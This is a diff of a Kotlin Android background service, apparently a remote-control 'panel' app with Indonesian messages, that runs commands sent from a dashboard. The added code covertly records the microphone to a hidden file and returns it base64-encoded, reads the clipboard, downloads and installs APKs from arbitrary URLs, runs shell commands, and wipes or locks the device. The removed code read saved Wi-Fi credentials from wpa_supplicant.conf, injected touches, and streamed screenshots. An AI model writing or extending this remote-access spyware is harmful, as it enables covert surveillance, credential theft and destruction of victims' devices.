+    // ─────────────────────────────────────────
+    //  DEVICE CONTROL
     // ─────────────────────────────────────────
 
     private fun lockScreen(): String {
         return try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
             val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
-            if (dpm.isAdminActive(admin)) {
-                dpm.lockNow()
-                "🔒 Layar berhasil dikunci"
-            } else {
-                "⚠️ Device Admin belum aktif. Aktifkan dulu dari app."
-            }
+            if (dpm.isAdminActive(admin)) { dpm.lockNow(); "🔒 Layar dikunci" }
+            else "⚠️ Device Admin belum aktif."
         } catch (e: Exception) { "Error: ${e.message}" }
     }
-
-    // ─────────────────────────────────────────
-    //  WIPE DEVICE
-    // ─────────────────────────────────────────
 
     private fun wipeDevice(): String {
         return try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
             val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
-            if (dpm.isAdminActive(admin)) {
-                dpm.wipeData(0)
-                "💀 Perangkat sedang direset ke setelan pabrik…"
-            } else {
-                "⚠️ Device Admin belum aktif. Tidak bisa wipe."
-            }
+            if (dpm.isAdminActive(admin)) { dpm.wipeData(0); "💀 Factory reset dimulai…" }
+            else "⚠️ Device Admin belum aktif."
         } catch (e: Exception) { "Error: ${e.message}" }
     }
-
-    // ─────────────────────────────────────────
-    //  CUSTOM VIBRATE
-    // ─────────────────────────────────────────
 
     private fun vibrateCustom(times: Int): String {
         return try {
@@ -665,115 +760,86 @@ class ConnectorService : Service() {
             val n = times.coerceIn(1, 10)
             val pattern = LongArray(n * 2 + 1)
             pattern[0] = 0
-            for (i in 1 until pattern.size step 2) {
-                pattern[i] = 300
-                if (i + 1 < pattern.size) pattern[i + 1] = 200
-            }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
-            } else {
-                @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
-            }
+            for (i in 1 until pattern.size step 2) { pattern[i] = 300; if (i + 1 < pattern.size) pattern[i + 1] = 200 }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
+            else @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
             "📳 Bergetar $n kali"
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
-    // ─────────────────────────────────────────
-    //  SEND CUSTOM NOTIFICATION
-    // ─────────────────────────────────────────
-
     private fun sendCustomNotification(extra: String?): String {
         return try {
-            val title: String
-            val text: String
+            val title: String; val text: String
             if (extra != null) {
-                val json = com.google.gson.JsonParser.parseString(extra).asJsonObject
-                title = json.get("title")?.asString ?: "Pesan"
-                text  = json.get("text")?.asString ?: ""
-            } else {
-                title = "Pesan dari Dashboard"
-                text  = ""
-            }
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-            val notif = androidx.core.app.NotificationCompat.Builder(this, CHANNEL_ID)
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setContentTitle(title)
-                .setContentText(text)
-                .setAutoCancel(true)
-                .build()
+                val json = JsonParser.parseString(extra).asJsonObject
+                title = json.get("title")?.asString ?: "Pesan"; text = json.get("text")?.asString ?: ""
+            } else { title = "Pesan dari Dashboard"; text = "" }
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            val notif = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(title)
+                .setContentText(text).setAutoCancel(true).build()
             nm.notify((System.currentTimeMillis() % 10000).toInt(), notif)
             "📢 Notifikasi terkirim: \"$title\""
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
-    // ─────────────────────────────────────────
-    //  GET CLIPBOARD
-    // ─────────────────────────────────────────
-
     @android.annotation.SuppressLint("ServiceCast")
     private fun getClipboard(): String {
         return try {
             val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-            val clip = cm.primaryClip
-            if (clip == null || clip.itemCount == 0) return "📋 Clipboard kosong"
-            val text = clip.getItemAt(0).coerceToText(this).toString()
-            "📋 Clipboard:\n$text"
+            val clip = cm.primaryClip ?: return "📋 Clipboard kosong"
+            "📋 Clipboard:\n${clip.getItemAt(0).coerceToText(this)}"
         } catch (e: Exception) { "Error: ${e.message}" }
     }
-
-    // ─────────────────────────────────────────
-    //  INSTALL APK FROM URL
-    // ─────────────────────────────────────────
 
     private fun installApk(url: String): String {
         return try {
             val file = java.io.File(getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
-            val request = okhttp3.Request.Builder().url(url).build()
-            http.newCall(request).execute().use { resp ->
+            http.newCall(Request.Builder().url(url).build()).execute().use { resp ->
                 if (!resp.isSuccessful) return "Error: HTTP ${resp.code}"
-                resp.body?.byteStream()?.use { input ->
-                    file.outputStream().use { output -> input.copyTo(output) }
-                }
+                resp.body?.byteStream()?.use { input -> file.outputStream().use { output -> input.copyTo(output) } }
             }
-            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                androidx.core.content.FileProvider.getUriForFile(
-                    this, "$packageName.fileprovider", file)
-            } else {
-                android.net.Uri.fromFile(file)
-            }
-            val intent = Intent(Intent.ACTION_VIEW).apply {
+            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
+                androidx.core.content.FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
+            else android.net.Uri.fromFile(file)
+            startActivity(Intent(Intent.ACTION_VIEW).apply {
                 setDataAndType(uri, "application/vnd.android.package-archive")
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
-            }
-            startActivity(intent)
-            "📦 APK diunduh & instalasi dimulai: ${file.name}"
+            })
+            "📦 APK instalasi dimulai: ${file.name}"
         } catch (e: Exception) { "Error install APK: ${e.message}" }
     }
 
     // ─────────────────────────────────────────
-    //  WIFI SAVED NETWORKS
+    //  MIC RECORDING
     // ─────────────────────────────────────────
 
-    @android.annotation.SuppressLint("MissingPermission")
-    private fun getWifiSaved(): String {
+    private fun recordMic(durationSec: Int): String {
+        val tmpPath = "${cacheDir.absolutePath}/.mic_${System.currentTimeMillis()}.3gp"
+        var mr: android.media.MediaRecorder? = null
         return try {
-            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-            @Suppress("DEPRECATION")
-            val configs = wm.configuredNetworks
-            if (configs.isNullOrEmpty()) {
-                return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
+            mr = android.media.MediaRecorder().apply {
+                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                setAudioSamplingRate(8000); setAudioEncodingBitRate(12200)
+                setOutputFile(tmpPath); prepare(); start()
             }
-            buildString {
-                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
-                configs.forEach { cfg ->
-                    val ssid = cfg.SSID?.replace("\"", "") ?: "?"
-                    appendLine("SSID: $ssid")
-                }
-            }
+            Thread.sleep(durationSec.toLong() * 1000)
+            mr.stop(); mr.release(); mr = null
+            val bytes = java.io.File(tmpPath).readBytes()
+            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
+            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
         } catch (e: Exception) {
-            runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'")
+            try { mr?.stop() } catch (_: Exception) {}; try { mr?.release() } catch (_: Exception) {}
+            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
+            "ERROR: ${e.message}"
         }
     }
+
+    // ─────────────────────────────────────────
+    //  SHELL
+    // ─────────────────────────────────────────
 
     private fun runShell(cmd: String): String {
         return try {
@@ -785,292 +851,6 @@ class ConnectorService : Service() {
                 if (out.isNotEmpty()) append(out)
                 if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
             }.ifEmpty { "(no output)" }
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    private fun runShizuku(cmd: String): String {
-        if (!isShizukuAvailable()) return "⚠️ Shizuku N/A · fallback:\n" + runShell(cmd)
-        return try {
-            val m = Shizuku::class.java.getDeclaredMethod("newProcess",
-                Array<String>::class.java, Array<String>::class.java, String::class.java)
-            m.isAccessible = true
-            @Suppress("UNCHECKED_CAST")
-            val p = m.invoke(null, arrayOf("sh", "-c", cmd), null as Array<String>?, null as String?) as Process
-            val out = p.inputStream.bufferedReader().readText()
-            val err = p.errorStream.bufferedReader().readText()
-            p.waitFor()
-            buildString {
-                if (out.isNotEmpty()) append(out)
-                if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
-            }.ifEmpty { "(no output)" }
-        } catch (e: Exception) { "ERROR (Shizuku): ${e.message}" }
-    }
-
-    private fun isShizukuAvailable() = try {
-        Shizuku.pingBinder() && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
-    } catch (_: Exception) { false }
-
-    private fun getShizukuStatus() = try {
-        val ok = Shizuku.pingBinder()
-        val gn = ok && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
-        buildString {
-            appendLine("=== Shizuku ===")
-            appendLine("Binder: ${if (ok) "✅ OK" else "❌ Not running"}")
-            appendLine("Permission: ${if (gn) "✅ Granted" else "❌ Not granted"}")
-            if (ok) { appendLine("Version: ${Shizuku.getVersion()}"); appendLine("UID: ${Shizuku.getUid()}") }
-            appendLine()
-            appendLine("=== AccessibilityService (Input) ===")
-            appendLine("ControlA11y: ${if (ControlAccessibilityService.isAvailable()) "✅ Active (no Shizuku!)" else "❌ Not active — aktifkan di Settings > Accessibility"}")
-            appendLine()
-            appendLine("=== MediaProjection (Screen Capture) ===")
-            appendLine("MediaProjection: ${if (MediaProjectionHolder.isAvailable()) "✅ Active (no Shizuku!)" else "❌ Not active — buka app untuk grant izin"}")
-        }
-    } catch (e: Exception) { "ERROR: ${e.message}" }
-
-    // ─────────────────────────────────────────
-    //  MIC RECORDING
-    // ─────────────────────────────────────────
-
-    private fun recordMic(durationSec: Int): String {
-        val tmpPath = "/sdcard/.mic_tmp_${System.currentTimeMillis()}.3gp"
-        var mr: android.media.MediaRecorder? = null
-        return try {
-            mr = android.media.MediaRecorder().apply {
-                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
-                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
-                setAudioSamplingRate(8000)
-                setAudioEncodingBitRate(12200)
-                setOutputFile(tmpPath)
-                prepare()
-                start()
-            }
-            Thread.sleep(durationSec.toLong() * 1000)
-            mr.stop()
-            mr.release()
-            mr = null
-            val bytes = java.io.File(tmpPath).readBytes()
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-        } catch (e: Exception) {
-            try { mr?.stop() } catch (_: Exception) {}
-            try { mr?.release() } catch (_: Exception) {}
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            "ERROR: ${e.message} (pastikan RECORD_AUDIO permission diberikan)"
-        }
-    }
-
-    // ─────────────────────────────────────────
-    //  REMOTE CONTROL — TOUCH INJECT
-    // ─────────────────────────────────────────
-
-    @Suppress("DEPRECATION")
-    private fun getScreenSize(): String {
-        return try {
-            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-            val metrics = android.util.DisplayMetrics()
-            wm.defaultDisplay.getRealMetrics(metrics)
-            "${metrics.widthPixels}x${metrics.heightPixels}"
-        } catch (e: Exception) {
-            // Fallback: ask Shizuku
-            try {
-                val out = runShizuku("wm size")
-                // "Physical size: 1080x2340"
-                out.lines().firstOrNull { it.contains("Physical size") }
-                    ?.substringAfter("Physical size:")?.trim() ?: "ERROR: ${e.message}"
-            } catch (e2: Exception) { "ERROR: ${e2.message}" }
-        }
-    }
-
-    @Suppress("DEPRECATION")
-    private fun injectTapPct(xPct: Float, yPct: Float): String {
-        return try {
-            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-            val metrics = android.util.DisplayMetrics()
-            wm.defaultDisplay.getRealMetrics(metrics)
-            val x = (xPct.coerceIn(0f, 1f) * metrics.widthPixels).toInt()
-            val y = (yPct.coerceIn(0f, 1f) * metrics.heightPixels).toInt()
-
-            // Priority 1: AccessibilityService — ~5–20ms, no Shizuku, persistent
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchTapSync(x.toFloat(), y.toFloat())
-                return if (ok) "OK: tap ($x,$y) via Accessibility"
-                else "WARN: Accessibility tap gagal, retry via Shizuku\n" + runShizuku("input tap $x $y")
-            }
-            // Fallback: Shizuku shell
-            val result = runShizuku("input tap $x $y")
-            "OK: tap at ($x, $y) [${"%.3f".format(xPct)}, ${"%.3f".format(yPct)}] | $result"
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    @Suppress("DEPRECATION")
-    private fun injectLongPressPct(xPct: Float, yPct: Float): String {
-        return try {
-            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-            val metrics = android.util.DisplayMetrics()
-            wm.defaultDisplay.getRealMetrics(metrics)
-            val x = (xPct.coerceIn(0f, 1f) * metrics.widthPixels).toInt()
-            val y = (yPct.coerceIn(0f, 1f) * metrics.heightPixels).toInt()
-
-            // Priority 1: AccessibilityService — dispatchLongPressSync (800ms hold)
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchLongPressSync(x.toFloat(), y.toFloat())
-                return if (ok) "OK: long press ($x,$y) via Accessibility"
-                else "WARN: Accessibility long press gagal, retry via Shizuku\n" +
-                        runShizuku("input swipe $x $y $x $y 800")
-            }
-            // Fallback: Shizuku — simulate long press with 0-distance swipe, 800ms duration
-            val result = runShizuku("input swipe $x $y $x $y 800")
-            "OK: long press ($x,$y) [${"%.3f".format(xPct)}, ${"%.3f".format(yPct)}] | $result"
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    @Suppress("DEPRECATION")
-    private fun injectSwipePct(x1Pct: Float, y1Pct: Float, x2Pct: Float, y2Pct: Float, durationMs: Int): String {
-        return try {
-            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-            val metrics = android.util.DisplayMetrics()
-            wm.defaultDisplay.getRealMetrics(metrics)
-            val w = metrics.widthPixels; val h = metrics.heightPixels
-            val x1 = (x1Pct.coerceIn(0f, 1f) * w).toInt()
-            val y1 = (y1Pct.coerceIn(0f, 1f) * h).toInt()
-            val x2 = (x2Pct.coerceIn(0f, 1f) * w).toInt()
-            val y2 = (y2Pct.coerceIn(0f, 1f) * h).toInt()
-
-            // Priority 1: AccessibilityService — no Shizuku, persistent
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchSwipeSync(
-                    x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), durationMs.toLong()
-                )
-                return if (ok) "OK: swipe ($x1,$y1)→($x2,$y2) ${durationMs}ms via Accessibility"
-                else "WARN: Accessibility swipe gagal, retry via Shizuku\n" +
-                        runShizuku("input swipe $x1 $y1 $x2 $y2 $durationMs")
-            }
-            // Fallback: Shizuku shell
-            val result = runShizuku("input swipe $x1 $y1 $x2 $y2 $durationMs")
-            "OK: swipe ($x1,$y1)→($x2,$y2) ${durationMs}ms | $result"
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  SCREENSHOT PIPELINE
-    // ─────────────────────────────────────────
-
-    /**
-     * Mulai pre-capture frame berikutnya di background thread.
-     * Dipanggil tepat setelah frame sekarang siap (sebelum upload dimulai).
-     * Hasilnya disimpan di [pipelinedFrame] dan dipakai di iterasi berikutnya.
-     *
-     * Kalau pipeline thread sebelumnya masih jalan (belum selesai capture),
-     * biarkan dia selesai — hasilnya tetap valid untuk frame berikutnya.
-     */
-    private fun startPipelineCapture(maxWidth: Int, quality: Int) {
-        // Jika pipeline sebelumnya masih berjalan & belum ada hasil → tunggu dia
-        val prev = pipelineThread
-        if (prev != null && prev.isAlive && pipelinedFrame == null) return
-
-        // Interrupt pipeline lama yang sudah ada hasilnya (stale), mulai baru
-        prev?.interrupt()
-
-        pipelineThread = Thread {
-            try {
-                val next = takeScreenshot(maxWidth, quality)
-                if (!Thread.currentThread().isInterrupted) {
-                    pipelinedFrame = next
-                }
-            } catch (_: InterruptedException) {}
-        }.also { it.isDaemon = true; it.start() }
-    }
-
-    /** Bersihkan pipeline saat streaming berhenti atau command bukan screenshot. */
-    private fun stopPipeline() {
-        pipelineThread?.interrupt()
-        pipelineThread = null
-        pipelinedFrame = null
-    }
-
-    // ─────────────────────────────────────────
-    //  SCREENSHOT
-    // ─────────────────────────────────────────
-
-    private fun takeScreenshot(maxWidth: Int = 720, quality: Int = 70): String {
-        val tmpPath = "/sdcard/.sc_tmp.png"
-        return try {
-            // Strategy 0: MediaProjection — hardware accelerated, ~16–33ms/frame (no Shizuku!)
-            // Tersedia setelah user grant permission di MainActivity
-            if (MediaProjectionHolder.isAvailable()) {
-                val frame = MediaProjectionHolder.captureFrameBase64(maxWidth, quality, 600)
-                if (frame != null && !frame.startsWith("ERROR")) return frame
-            }
-
-            // Strategy 1: Shizuku (system UID — paling reliable)
-            if (isShizukuAvailable()) {
-                java.io.File(tmpPath).delete()   // hapus sisa file lama
-                runShizuku("screencap -p $tmpPath")
-                // Wait max 1000ms (dari 3000ms) dengan interval 50ms (dari 100ms)
-                var waited = 0
-                while (!java.io.File(tmpPath).exists() && waited < 1000) {
-                    Thread.sleep(50); waited += 50
-                }
-                if (java.io.File(tmpPath).exists()) {
-                    val result = FileOperations.screenshotFromFile(tmpPath, maxWidth, quality)
-                    java.io.File(tmpPath).delete()   // immediate cleanup
-                    if (!result.startsWith("ERROR")) return result
-                }
-            }
-
-            // Strategy 2: Runtime.exec → baca PNG dari stdout LANGSUNG (NO file I/O!)
-            // Eliminasi: tulis disk + baca disk + wait loop = hemat ~100-200ms
-            try {
-                val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
-                val exited = proc.waitFor(3, java.util.concurrent.TimeUnit.SECONDS)
-                if (exited) {
-                    val pngBytes = proc.inputStream.readBytes()
-                    if (pngBytes.size > 1000) {
-                        val result = screenshotFromBytes(pngBytes, maxWidth, quality)
-                        if (!result.startsWith("ERROR")) return result
-                    }
-                }
-                proc.destroy()
-            } catch (_: Exception) {}
-
-            // Strategy 3: shell screencap ke file (fallback)
-            try {
-                java.io.File(tmpPath).delete()
-                runShell("screencap -p $tmpPath")
-                Thread.sleep(200)   // dikurangi dari 500ms
-                if (java.io.File(tmpPath).exists()) {
-                    val result = FileOperations.screenshotFromFile(tmpPath, maxWidth, quality)
-                    java.io.File(tmpPath).delete()
-                    if (!result.startsWith("ERROR")) return result
-                }
-            } catch (_: Exception) {}
-
-            "ERROR: Screenshot gagal. Aktifkan Shizuku dan berikan permission ke app."
-        } catch (e: Exception) {
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            "ERROR: ${e.message}"
-        }
-    }
-
-    /**
-     * Decode PNG bytes dan encode ke base64 JPEG — TANPA disk I/O sama sekali.
-     * Dipakai oleh Strategy 2 yang baca screencap langsung dari stdout.
-     */
-    private fun screenshotFromBytes(pngBytes: ByteArray, maxWidth: Int, quality: Int): String {
-        return try {
-            // Decode dengan inSampleSize untuk downscale sekaligus decode (hemat RAM)
-            val opts1 = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
-            android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts1)
-            val scale = if (opts1.outWidth > maxWidth && maxWidth > 0)
-                (opts1.outWidth.toFloat() / maxWidth).toInt().coerceAtLeast(1) else 1
-            val opts2 = android.graphics.BitmapFactory.Options().apply { inSampleSize = scale }
-            val bmp = android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts2)
-                ?: return "ERROR: BitmapFactory decode failed"
-            val baos = java.io.ByteArrayOutputStream()
-            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos)
-            bmp.recycle()
-            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
@@ -1111,9 +891,8 @@ class ConnectorService : Service() {
     // ─────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        val chan = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name),
-            NotificationManager.IMPORTANCE_LOW).apply {
-            description = getString(R.string.channel_desc); setShowBadge(false) }
+        val chan = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name), NotificationManager.IMPORTANCE_LOW)
+            .apply { description = getString(R.string.channel_desc); setShowBadge(false) }
         (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
     }
 
@@ -1125,7 +904,7 @@ class ConnectorService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_menu_share)
-            .setContentTitle("AndroidConnector ${if (connected) "🟢" else "🔴"}")
+            .setContentTitle("IWX Panel ${if (connected) "🟢" else "🔴"}")
             .setContentText(status)
             .setContentIntent(open)
             .addAction(android.R.drawable.ic_delete, "Stop", stop)
@@ -1141,7 +920,7 @@ class ConnectorService : Service() {
 
     private fun acquireWakeLock() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidConnector:WakeLock")
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IWXPanel:WakeLock")
             .apply { acquire(24 * 60 * 60 * 1000L) }
     }
 
